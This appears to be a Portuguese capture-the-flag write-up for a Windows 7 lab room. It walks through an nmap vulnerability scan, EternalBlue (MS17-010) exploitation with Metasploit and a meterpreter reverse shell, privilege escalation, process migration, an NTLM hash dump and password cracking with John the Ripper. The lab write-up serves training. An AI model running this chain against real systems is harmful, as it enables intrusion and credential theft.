ROOM BLUE

Executado o scan para enumeração de portas, serviços e vulnerabilidade:
nmap -vv -sV --script vuln -Pn 10.10.223.98

Portas:
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Vulnerabilidades:
MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
MS17-010 Remote Code Execution vulnerability in Microsoft SMBv1 servers


Validado que a versão do Windows:
auxiliary/scanner/smb/smb_ms17_010
VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)


Para obtenção de acesso usei o exploit "ms17-010 Eternalblue".
exploit/windows/smb/ms17_010_eternalblue
payload/windows/x64/meterpreter/reverse_tcp

Obtido o acesso com sucesso, o próximo passo é fazer a escalação de privilégios e para isso usei o módulo
post/multi/manage/shell_to_meterpreter


Validado que a exploração até o momento foi efetuado com sucesso.
O usuário é o SYSTEM que tem privilégios de administrador.
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM


Com o comando PS capturei o PID do TrustedInstaller.exe (3048).
Efetuado a migração do processo de invasão par dentro do processo do TrustedInstaller.exe (3048), com sucesso.
Módulo de persistência.
meterpreter > migrate 3048
[*] Migrating from 1680 to 3048...
[*] Migration completed successfully.


Capturado a hash de senhas dos usuários.
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::


Executado o john the ripper para quebrar a senha do usuário john e encontramos a senha do mesmo.
john hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt

alqfna22         (Jon)


O próximo passo foi acessar o servidor via RDP e capturar as flags.
rdp <ip do alvo>

Flag1: C:\
Flag2: C:\Windows\System32\Config
Flag3: C:\Users\Jon\MyDocuments


